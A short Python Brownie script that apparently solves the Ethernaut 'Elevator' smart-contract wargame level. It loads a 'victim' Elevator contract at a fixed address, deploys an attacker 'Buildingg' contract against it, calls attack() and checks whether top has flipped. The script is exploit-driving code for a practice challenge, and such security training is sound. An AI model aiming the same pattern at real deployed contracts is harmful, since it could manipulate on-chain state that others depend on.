from scripts.helpful_scripts import POINT_ONE, TEN, get_account, ONE
from brownie import Elevator, Buildingg, network, Contract


def deploy_Elevator():
    account = get_account()
    ele = Elevator.deploy(
        {"from": account},
    )
    return ele


def deploy_Building(victim):
    account = get_account()
    building = Buildingg.deploy(
        victim,
        {"from": account},
    )
    return building


def main():
    print(network.show_active())
    account = get_account()
    # elevator = deploy_Elevator()
    victim_address = "0x50269CbEFE12212f2653c181199a34dca8719729"
    elevator = Contract.from_abi(Elevator._name, victim_address, Elevator.abi)
    print(elevator.top())
    building = deploy_Building(victim_address)
    building.attack({"from": account})
    print(elevator.top())
